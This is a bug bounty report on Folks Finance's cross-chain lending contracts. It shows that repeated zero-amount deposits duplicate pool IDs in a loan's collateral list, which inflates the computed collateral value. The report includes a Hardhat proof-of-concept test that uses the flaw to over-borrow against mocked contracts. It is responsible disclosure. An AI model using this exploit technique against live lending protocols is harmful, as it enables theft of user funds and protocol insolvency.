# Boost \_ Folks Finance 33978 - \[Smart Contract - Critical] Attacker can Inflate effectiveCollateralVa

Submitted on Sat Aug 03 2024 06:43:07 GMT-0400 (Atlantic Standard Time) by @arno for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33978

Report type: Smart Contract

Report severity: Critical

Target: <https://testnet.snowtrace.io/address/0x2cAa1315bd676FbecABFC3195000c642f503f1C9>

Impacts:

* Protocol insolvency
* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A user can exploit the `LoanManager::deposit()` function to deposit a 0 token amount for a specific loanID, resulting in the `colPools` array containing duplicate loanIDs of the same pool. This causes the `UserLoanLogic::getLoanLiquidity` function, which calculates `effectiveCollateralValue` by iterating through all poolIds in the `colPools` array, to return an incorrect and inflated `effectiveCollateralValue`. This vulnerability can be exploited in various scenarios, leading to significant issues within the protocol.

## Vulnerability Details

In the protocol, users can deposit collateral using the `LoanManager::deposit()` function, which allows them to pass any amount, including 0.

### Code Snippet: `LoanManager::deposit()`

```solidity
function deposit(
    bytes32 loanId,
    bytes32 accountId,
    uint8 poolId,
    uint256 amount
) external override onlyRole(HUB_ROLE) nonReentrant {
    if (!isUserLoanActive(loanId)) revert UnknownUserLoan(loanId);
    if (!isUserLoanOwner(loanId, accountId)) revert NotAccountOwner(loanId, accountId);

    LoanManagerLogic.executeDeposit(
        _userLoans,
        _loanTypes,
        _pools,
        _userPoolRewards,
        DataTypes.ExecuteDepositParams({ loanId: loanId, poolId: poolId, amount: amount })
    );
}
```

### Code Snippet: `executeDeposit` Function in `LoanManagerLogic`

```solidity
function executeDeposit(
    mapping(bytes32 => LoanManagerState.UserLoan) storage userLoans,
    mapping(uint16 loanTypeId => LoanManagerState.LoanType) storage loanTypes,
    mapping(uint8 => IHubPool) storage pools,
    mapping(bytes32 accountId => mapping(uint8 poolId => LoanManagerState.UserPoolRewards)) storage userPoolRewards,
    DataTypes.ExecuteDepositParams memory params
) external {
    LoanManagerState.UserLoan storage userLoan = userLoans[params.loanId];
    LoanManagerState.LoanType storage loanType = loanTypes[userLoan.loanTypeId];
    LoanManagerState.LoanPool storage loanPool = loanType.pools[params.poolId];

    if (loanType.isDeprecated) revert LoanManagerState.LoanTypeDeprecated(userLoan.loanTypeId);
    if (!loanPool.isAdded) revert LoanManagerState.LoanPoolUnknown(userLoan.loanTypeId, params.poolId);
    if (loanPool.isDeprecated) revert LoanManagerState.LoanPoolDeprecated(userLoan.loanTypeId, params.poolId);

    IHubPool pool = pools[params.poolId];
    DataTypes.DepositPoolParams memory depositPoolParams = pool.updatePoolWithDeposit(params.amount);

    if (
        loanPool.isCollateralCapReached(
            depositPoolParams.priceFeed,
            depositPoolParams.fAmount,
            depositPoolParams.depositInterestIndex
        )
    ) revert CollateralCapReached(params.poolId);

    RewardLogic.updateRewardIndexes(loanPool, params.poolId);
    RewardLogic.updateUserCollateralReward(userPoolRewards, userLoan, loanPool, params.poolId);

    userLoan.increaseCollateral(params.poolId, depositPoolParams.fAmount);
    loanPool.increaseCollateral(depositPoolParams.fAmount);

    emit Deposit(params.loanId, params.poolId, params.amount, depositPoolParams.fAmount);
}
```

### Calculation of `fAmount`

The `fAmount` is calculated based on the `amount` input:

```solidity
depositPoolParams.fAmount = amount.toFAmount(depositInterestIndex);
```

### Rounding Issue in `fAmount`

When the amount is not 0, the `fAmount` can round down to 0 as well in certain cases:

```solidity
function toFAmount(uint256 underlyingAmount, uint256 depositInterestIndexAtT) internal pure returns (uint256) {
    return underlyingAmount.mulDiv(ONE_18_DP, depositInterestIndexAtT);
}
```

### `increaseCollateral` Function

The `increaseCollateral` function then adds the poolId to the `colPools` array if the balance was previously 0:

```solidity
function increaseCollateral(LoanManagerState.UserLoan storage loan, uint8 poolId, uint256 fAmount) external {
    if (loan.collaterals[poolId].balance == 0) loan.colPools.push(poolId);
    loan.collaterals[poolId].balance += fAmount;
}
```

This indicates that when a user deposits for the first time into the pool, if the balance is 0, the `poolId` is pushed to the `colPools` array, and the associated balance for that pool is increased. By passing a 0 token amount, this function will keep pushing the `poolId` to the `colPools` array, causing it to contain duplicate pool IDs. This can be exploited to inflate the `effectiveCollateralValue` in the `UserLoanLogic::getLoanLiquidity()` function.

### Code Snippet: Inflating `effectiveCollateralValue`

```solidity
poolsLength = loan.colPools.length;
for (uint8 i = 0; i < poolsLength; i++) {
    poolId = loan.colPools[i];

    balance = loan.collaterals[poolId].balance.toUnderlingAmount(
        pools[poolId].getUpdatedDepositInterestIndex()
    );
    priceFeed = oracleManager.processPriceFeed(poolId);
    effectiveValue += MathUtils.calcCollateralAssetLoanValue(
        balance,
        priceFeed.price,
        priceFeed.decimals,
        loanPools[poolId].collateralFactor
    );
}
loanLiquidity.effectiveCollateralValue = effectiveValue;
```

### Attack Path

1. **Alice** deposits a small amount of collateral in Pool A and Pool B.
2. **Bob** discovers that by depositing 0 tokens multiple times, the same Pool ID is repeatedly added to his `colPools` array.
3. Bob exploits this by inflating his `effectiveCollateralValue`, allowing him to:
   * **Borrow significantly more** than he should be able to.
   * **Bypass the `isLoanOverCollateralized` checks**, enabling him to withdraw collateral while having outstanding loans.
   * **Avoid liquidation** since the inflated `effectiveCollateralValue` prevents his loan from being flagged as under-collateralized.

## Impact Details

If exploited, this vulnerability could lead to significant financial losses within the protocol. The inflated `effectiveCollateralValue` could allow users to borrow more than they should, withdraw collateral they aren't entitled to, or avoid liquidation, potentially resulting in insolvency of the protocol and loss of funds for all users.

## References

* [LoanManagerLogic.sol - Folks Finance Xchain Contracts](https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/fb92deccd27359ea4f0cf0bc41394c86448c7abb/contracts/hub/logic/LoanManagerLogic.sol#L66C1-L104C6)

## Proof of concept

## Proof of Concept

```
import { expect } from "chai";
import { ethers } from "hardhat";
import { PANIC_CODES } from "@nomicfoundation/hardhat-chai-matchers/panic";
import { loadFixture, reset, time } from "@nomicfoundation/hardhat-toolbox/network-helpers";
import {
  LiquidationLogic__factory,
  LoanManagerLogic__factory,
  LoanManager__factory,
  LoanPoolLogic__factory,
  MockHubPool__factory,
  MockOracleManager__factory,
  RewardLogic__factory,
  UserLoanLogic__factory,
} from "../../typechain-types";
import { BYTES32_LENGTH, convertStringToBytes, getAccountIdBytes, getEmptyBytes, getRandomBytes } from "../utils/bytes";
import { SECONDS_IN_DAY, SECONDS_IN_HOUR, getLatestBlockTimestamp, getRandomInt } from "../utils/time";
import { UserLoanBorrow, UserLoanCollateral } from "./libraries/assets/loanData";
import { getNodeOutputData } from "./libraries/assets/oracleData";
import {
  calcAverageStableRate,
  calcBorrowBalance,
  calcBorrowInterestIndex,
  calcReserveCol,
  calcStableInterestRate,
  convToCollateralFAmount,
  convToRepayBorrowAmount,
  convToSeizedCollateralAmount,
  toFAmount,
  toUnderlingAmount,
} from "./utils/formulae";

describe("Attacker can Inflate `effectiveCollateralValue`", () => {
  const DEFAULT_ADMIN_ROLE = getEmptyBytes(BYTES32_LENGTH);
  const LISTING_ROLE = ethers.keccak256(convertStringToBytes("LISTING"));
  const ORACLE_ROLE = ethers.keccak256(convertStringToBytes("ORACLE"));
  const HUB_ROLE = ethers.keccak256(convertStringToBytes("HUB"));

  async function deployLoanManagerFixture() {
    const [admin, hub, user, ...unusedUsers] = await ethers.getSigners();

    // libraries
    const userLoanLogic = await new UserLoanLogic__factory(user).deploy();
    const userLoanLogicAddress = await userLoanLogic.getAddress();
    const loanPoolLogic = await new LoanPoolLogic__factory(user).deploy();
    const loanPoolLogicAddress = await loanPoolLogic.getAddress();
    const liquidationLogic = await new LiquidationLogic__factory(
      {
        ["contracts/hub/logic/UserLoanLogic.sol:UserLoanLogic"]: userLoanLogicAddress,
      },
      user
    ).deploy();
    const liquidationLogicAddress = await liquidationLogic.getAddress();
    const loanManagerLogic = await new LoanManagerLogic__factory(
      {
        ["contracts/hub/logic/UserLoanLogic.sol:UserLoanLogic"]: userLoanLogicAddress,
        ["contracts/hub/logic/LoanPoolLogic.sol:LoanPoolLogic"]: loanPoolLogicAddress,
        ["contracts/hub/logic/LiquidationLogic.sol:LiquidationLogic"]: liquidationLogicAddress,
      },
      user
    ).deploy();
    const loanManagerLogicAddress = await loanManagerLogic.getAddress();
    const rewardLogic = await new RewardLogic__factory(user).deploy();
    const rewardLogicAddress = await rewardLogic.getAddress();

    const libraries = {
      userLoanLogic,
      loanPoolLogic,
      liquidationLogic,
      loanManagerLogic,
      rewardLogic,
    };

    // deploy contract
    const oracleManager = await new MockOracleManager__factory(user).deploy();
    const loanManager = await new LoanManager__factory(
      {
        ["contracts/hub/logic/LoanManagerLogic.sol:LoanManagerLogic"]: loanManagerLogicAddress,
        ["contracts/hub/logic/RewardLogic.sol:RewardLogic"]: rewardLogicAddress,
      },
      user
    ).deploy(admin, oracleManager);

    // set hub role
    await loanManager.connect(admin).grantRole(HUB_ROLE, hub);

    // common
    const loanManagerAddress = await loanManager.getAddress();

    return {
      admin,
      hub,
      user,
      unusedUsers,
      loanManager,
      loanManagerAddress,
      oracleManager,
      libraries,
    };
  }

  async function createLoanTypeFixture() {
    const { admin, hub, user, unusedUsers, loanManager, loanManagerAddress, oracleManager, libraries } =
      await loadFixture(deployLoanManagerFixture);

    // create loan type
    const loanTypeId = 1;
    const loanTargetHealth = BigInt(1.05e4); //
    await loanManager.connect(admin).createLoanType(loanTypeId, loanTargetHealth);

    return {
      admin,
      hub,
      user,
      unusedUsers,
      loanManager,
      loanManagerAddress,
      oracleManager,
      libraries,
      loanTypeId,
      loanTargetHealth,
    };
  }

  async function addPoolsFixture() {
    const { admin, hub, user, unusedUsers, loanManager, loanManagerAddress, oracleManager, libraries, loanTypeId } =
      await loadFixture(createLoanTypeFixture);

    // prepare pools
    const usdcPoolId = 1;
    const usdcPool = await new MockHubPool__factory(user).deploy("Folks USD Coin", "fUSDC", usdcPoolId);
    const ethPoolId = 2;
    const ethPool = await new MockHubPool__factory(user).deploy("Folks Ethereum", "fETH", ethPoolId);

    // add pools
    await loanManager.connect(admin).addPool(usdcPool);
    await loanManager.connect(admin).addPool(ethPool);

    return {
      admin,
      hub,
      user,
      unusedUsers,
      loanManager,
      loanManagerAddress,
      oracleManager,
      libraries,
      loanTypeId,
      usdcPoolId,
      usdcPool,
      ethPoolId,
      ethPool,
    };
  }
  async function addPoolToLoanTypeFixture() {
    const {
      admin,
      hub,
      user,
      unusedUsers,
      loanManager,
      loanManagerAddress,
      oracleManager,
      libraries,
      loanTypeId,
      usdcPoolId,
      usdcPool,
      ethPoolId,
      ethPool,
    } = await loadFixture(addPoolsFixture);

    // add pools to loan type
    const rewardCollateralSpeed = BigInt(0);
    const rewardBorrowSpeed = BigInt(0);
    const rewardMinimumAmount = BigInt(1e18);
    const collateralCap = BigInt(20e6);
    const borrowCap = BigInt(10e6);

    const usdcCollateralFactor = BigInt(0.8e4);
    const usdcBorrowFactor = BigInt(1e4);
    const usdcLiquidationBonus = BigInt(0.04e4);
    const usdcLiquidationFee = BigInt(0.1e4);

    const ethCollateralFactor = BigInt(0.7e4);
    const ethBorrowFactor = BigInt(1e4);
    const ethLiquidationBonus = BigInt(0.06e4);
    const ethLiquidationFee = BigInt(0.1e4);

    const pools = {
      USDC: {
        poolId: usdcPoolId,
        pool: usdcPool,
        rewardCollateralSpeed,
        rewardBorrowSpeed,
        rewardMinimumAmount,
        collateralCap,
        borrowCap,
        collateralFactor: usdcCollateralFactor,
        borrowFactor: usdcBorrowFactor,
        liquidationBonus: usdcLiquidationBonus,
        liquidationFee: usdcLiquidationFee,
        tokenDecimals: BigInt(6),
      },
      ETH: {
        poolId: ethPoolId,
        pool: ethPool,
        rewardCollateralSpeed,
        rewardBorrowSpeed,
        rewardMinimumAmount,
        collateralCap,
        borrowCap,
        collateralFactor: ethCollateralFactor,
        borrowFactor: ethBorrowFactor,
        liquidationBonus: ethLiquidationBonus,
        liquidationFee: ethLiquidationFee,
        tokenDecimals: BigInt(18),
      },
    };

    await loanManager
      .connect(admin)
      .addPoolToLoanType(
        loanTypeId,
        usdcPoolId,
        usdcCollateralFactor,
        collateralCap,
        usdcBorrowFactor,
        borrowCap,
        usdcLiquidationBonus,
        usdcLiquidationFee,
        rewardCollateralSpeed,
        rewardBorrowSpeed,
        rewardMinimumAmount
      );
    await loanManager
      .connect(admin)
      .addPoolToLoanType(
        loanTypeId,
        ethPoolId,
        ethCollateralFactor,
        collateralCap,
        ethBorrowFactor,
        borrowCap,
        ethLiquidationBonus,
        ethLiquidationFee,
        rewardCollateralSpeed,
        rewardBorrowSpeed,
        rewardMinimumAmount
      );

    return {
      admin,
      hub,
      user,
      unusedUsers,
      loanManager,
      loanManagerAddress,
      oracleManager,
      libraries,
      loanTypeId,
      pools,
    };
  }

  async function createUserLoanFixture() {
    const {
      admin,
      hub,
      user,
      unusedUsers,
      loanManager,
      loanManagerAddress,
      oracleManager,
      libraries,
      loanTypeId,
      pools,
    } = await loadFixture(addPoolToLoanTypeFixture);

    // create user loan
    const loanId = getRandomBytes(BYTES32_LENGTH);
    const accountId = getAccountIdBytes("ACCOUNT_ID");
    const loanName = getRandomBytes(BYTES32_LENGTH);
    const createUserLoan = await loanManager.connect(hub).createUserLoan(loanId, accountId, loanTypeId, loanName);

    return {
      admin,
      hub,
      user,
      unusedUsers,
      loanManager,
      loanManagerAddress,
      oracleManager,
      libraries,
      createUserLoan,
      loanTypeId,
      pools,
      loanId,
      accountId,
      loanName,
    };
  }

  async function depositZeroTokenAmountToDIfferntPOOlFixture() {
    const {
      admin,
      hub,
      user,
      unusedUsers,
      loanManager,
      loanManagerAddress,
      oracleManager,
      libraries,
      loanTypeId,
      pools,
      loanId,
      accountId,
    } = await loadFixture(createUserLoanFixture);
    const { pool, poolId, tokenDecimals } = pools.USDC;

    // prepare deposit
    const depositAmountUSDC = BigInt(1);
    const depositInterestIndex = BigInt(1.2e18);
    const depositFAmountUSDC = toFAmount(depositAmountUSDC, depositInterestIndex);
    const usdcPrice = BigInt(1e18);
    await pool.setDepositPoolParams({
      fAmount: depositFAmountUSDC,
      depositInterestIndex,
      priceFeed: { price: usdcPrice, decimals: tokenDecimals },
    });

    // deposit into usdc pool
    // WE INFALTED THE `effectiveCollateralValue` BY DEPOSITING 0 TOKENS BY 5 TIMES colPools = [pools.USDC {balance = 0} , pools.USDC {balance = 0} , pools.USDC {balance = 0} , pools.USDC {balance = 0} , pools.USDC {balance = 0}]

    let i = 0;
    while (i < 5) {
      await loanManager.connect(hub).deposit(loanId, accountId, poolId, depositAmountUSDC);
      i++;
    }

    // prepare deposit
    let depositAmount = BigInt(1e18);

    let depositFAmount = (depositAmount * BigInt(1e18)) / BigInt(1e18);
    const ethPrice = BigInt(3000e18);
    await pools.ETH.pool.setDepositPoolParams({
      fAmount: depositFAmount,
      depositInterestIndex,
      priceFeed: { price: ethPrice, decimals: pools.ETH.tokenDecimals },
    });

    // deposit into eth pool

    // NOW = [pools.USDC {balance = 0} , pools.USDC {balance = 0} , pools.USDC {balance = 0} , pools.USDC {balance = 0} , pools.USDC {balance = 0} , pools.ETH {balance = 1e18}]

    const depositOneEther = await loanManager.connect(hub).deposit(loanId, accountId, pools.ETH.poolId, depositAmount);

    return {
      admin,
      hub,
      user,
      unusedUsers,
      loanManager,
      loanManagerAddress,
      oracleManager,
      libraries,
      depositOneEther,
      loanTypeId,
      pools,
      loanId,
      accountId,
      depositAmount,
      depositFAmount,
    };
  }
  async function depositeZeroTokenAmountIntoSamePOOlFixture() {
    const {
      admin,
      hub,
      user,
      unusedUsers,
      loanManager,
      loanManagerAddress,
      oracleManager,
      libraries,
      loanTypeId,
      pools,
      loanId,
      accountId,
    } = await loadFixture(createUserLoanFixture);

    let depositAmount = BigInt(0); // or BigInt(1) 1 wei
    let depositFAmount = (depositAmount * BigInt(1e18)) / BigInt(1.2e18);

    const depositInterestIndex = BigInt(1.2e18);
    const ethPrice = BigInt(3000e18);
    await pools.ETH.pool.setDepositPoolParams({
      fAmount: depositFAmount,
      depositInterestIndex,
      priceFeed: { price: ethPrice, decimals: pools.ETH.tokenDecimals },
    });
    // deposit into eth pool 5 times
    let i = 0;
    while (i < 5) {
      await loanManager.connect(hub).deposit(loanId, accountId, pools.ETH.poolId, depositAmount);
      i++;
    }

    // NOW = [pools.ETH {balance = 0} , pools.ETH {balance = 0} , pools.ETH {balance = 0} , pools.ETH {balance = 0} , pools.ETH {balance = 0}]

    // now deposit enought amount to take huge loan
    depositAmount = BigInt(1e18);
    depositFAmount = depositAmount;
    await pools.ETH.pool.setDepositPoolParams({
      fAmount: depositFAmount,
      depositInterestIndex,
      priceFeed: { price: ethPrice, decimals: pools.ETH.tokenDecimals },
    });

    // deposit into eth pool
    const depositOneEther = await loanManager.connect(hub).deposit(loanId, accountId, pools.ETH.poolId, depositAmount);

    // NOW = [pools.ETH {balance = 0} , pools.ETH {balance = 0} , pools.ETH {balance = 0} , pools.ETH {balance = 0} , pools.ETH {balance = 0} , pools.ETH {balance = 1e18}]

    return {
      admin,
      hub,
      user,
      unusedUsers,
      loanManager,
      loanManagerAddress,
      oracleManager,
      libraries,
      depositOneEther,
      loanTypeId,
      pools,
      loanId,
      accountId,
      depositAmount,
      depositFAmount,
    };
  }

  after(async () => {
    await reset();
  });

  describe("Test EXPLOIT", () => {
    it.only("Huge borrow for same pool deposit", async () => {
      const {
        admin,
        hub,
        user,
        unusedUsers,
        loanManager,
        loanManagerAddress,
        oracleManager,
        libraries,
        depositOneEther,
        loanTypeId,
        pools,
        loanId,
        accountId,
        depositAmount,
        depositFAmount,
      } = await loadFixture(depositeZeroTokenAmountIntoSamePOOlFixture);

      // set prices
      const ethNodeOutputData = getNodeOutputData(BigInt(3000e18));
      await oracleManager.setNodeOutput(pools.ETH.poolId, pools.ETH.tokenDecimals, ethNodeOutputData);

      // prepare borrow
      const variableInterestIndex = BigInt(1.2e18); // No interest
      const stableInterestRate = BigInt(0);
      await pools.ETH.pool.setBorrowPoolParams({ variableInterestIndex, stableInterestRate });
      await pools.ETH.pool.setUpdatedVariableBorrowInterestIndex(variableInterestIndex);

      const borrowAmount = BigInt(3e18);
      const borrow = await loanManager
        .connect(hub)
        .borrow(loanId, accountId, pools.ETH.poolId, borrowAmount, BigInt(0));
    });
    it.only("Huge borrow for different pool deposit", async () => {
      const {
        admin,
        hub,
        user,
        unusedUsers,
        loanManager,
        loanManagerAddress,
        oracleManager,
        libraries,
        depositOneEther,
        loanTypeId,
        pools,
        loanId,
        accountId,
        depositAmount,
        depositFAmount,
      } = await loadFixture(depositZeroTokenAmountToDIfferntPOOlFixture);

      // set prices
      const ethNodeOutputData = getNodeOutputData(BigInt(3000e18));
      await oracleManager.setNodeOutput(pools.ETH.poolId, pools.ETH.tokenDecimals, ethNodeOutputData);

      // prepare borrow
      const variableInterestIndex = BigInt(1.2e18); // No interest
      const stableInterestRate = BigInt(0);
      await pools.ETH.pool.setBorrowPoolParams({ variableInterestIndex, stableInterestRate });
      await pools.ETH.pool.setUpdatedVariableBorrowInterestIndex(variableInterestIndex);

      const borrowAmount = BigInt(3e18);
      const borrow = await loanManager
        .connect(hub)
        .borrow(loanId, accountId, pools.ETH.poolId, borrowAmount, BigInt(0));
    });
  });
});
```
